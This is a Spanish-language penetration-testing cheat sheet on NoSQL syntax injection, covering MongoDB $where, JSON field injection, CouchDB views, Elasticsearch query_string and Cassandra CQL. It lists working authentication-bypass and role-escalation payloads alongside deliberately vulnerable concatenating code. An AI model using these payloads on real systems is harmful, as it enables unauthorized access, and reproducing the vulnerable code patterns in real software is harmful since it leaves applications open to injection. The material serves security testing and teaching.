---
aliases:
  - NoSQL Syntax Injection
  - NoSQL String Injection
tags:
  - vuln/nosqli
  - technique/initial-access
  - asset/database
  - asset/web-app
primary categories:
secondary categories:
tertiary categories:
kind: SubCheatSheet
linked:
  - "[[NoSQL Injection]]"
---
# NoSQLi - Inyección Sintáctica

***

## Cheatsheet

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|---|
| **MongoDB shell string** | `admin' \|\| '1'=='1` | Escape de string + OR siempre true. Si app concatena a shell. |
| **MongoDB JS function** | `admin'); return true; //` | Cierre del string + retorno forzado + comment. |
| **JSON injection (break quote)** | `admin","role":"admin","x":"` | Rompe JSON + inyecta field extra si parser permisivo. |
| **Null byte truncate** | `admin ` | Trunca string en drivers legacy. |
| **Array en lugar de string** | `user[]=admin&user[]=guest` | Backend puede castear array → lookup múltiple. |
| **Injection en query ops** | `{"$where":"this.user=='" + input + "'"}` → `' \|\| 1==1 \|\| '` | Classic SQLi-style en `$where`. |
| **CouchDB view injection** | `key="admin"&startkey=" "&endkey="￰"` | Lista todos si endpoint acepta rangos. |
| **ElasticSearch query string** | `username:* OR role:admin` | Query DSL abierta → enum. |
| **Cassandra CQL-like** | `admin' OR 1=1 --` | CQL tiene SQLi-like syntax (semi-relacional). |
^nosqli-syntax

___

## Overview

Inyección sintáctica ocurre cuando el backend **concatena string** del user dentro de una query NoSQL en vez de pasar parámetros tipados. Más común en:
- Wrappers custom que construyen `$where` dinámicamente.
- CouchDB map/reduce functions.
- ElasticSearch query_string queries.
- Backends que interpretan código JS dentro de la DB.

### MongoDB $where con concatenación

Código vulnerable:
```javascript
const query = `this.user == '${req.body.user}'`;
db.users.find({ $where: query });
```

Payload:
```
user: admin' || '1'=='1
```

Query resultante:
```javascript
this.user == 'admin' || '1'=='1'
```
→ Siempre true → return todos los users.

### JSON escape + field injection

Código vulnerable:
```javascript
const body = JSON.parse(`{"user":"${req.body.user}","role":"user"}`);
```

Payload:
```
user: admin","role":"admin","x":"
```

JSON resultante:
```json
{"user":"admin","role":"admin","x":"","role":"user"}
```
→ Duplicate key; algunos parsers usan el **primer** o **último** → `role: admin` wins.

### CouchDB views

CouchDB view con `_design/app/_view/byuser?key="admin"` — si la app pasa `key` sin sanitizar:
```
key="admin' OR 1==1 OR '"
```
No siempre funciona (CouchDB es JSON-strict) pero range queries sí:
```
startkey="a"&endkey="z"
```
→ Enum todos.

### ElasticSearch query_string

Si app pasa user input directo a `query_string`:
```json
{"query":{"query_string":{"query":"username:USER_INPUT"}}}
```

Payload:
```
" OR role:admin OR username:"
```

Query resultante:
```
username:"" OR role:admin OR username:""
```

### Cassandra CQL

Cassandra usa CQL (casi SQL). Misma surface que SQLi:
```
SELECT * FROM users WHERE user='admin' AND pass='INPUT';
```

Payload (si bien CQL tiene protecciones):
```
' OR token(user) > token('') ALLOW FILTERING --
```

### Detección práctica

1. Probar comillas simples/dobles en cada campo → 500 error o query rota = concatenación sin escape.
2. Probar `{"$where":"..."}` si JSON body → si no rechaza sintaxis = parsing liberal.
3. Fuzzear con chars especiales: `'`, `"`, `\`, ` `, `\n`, `\r`.

***
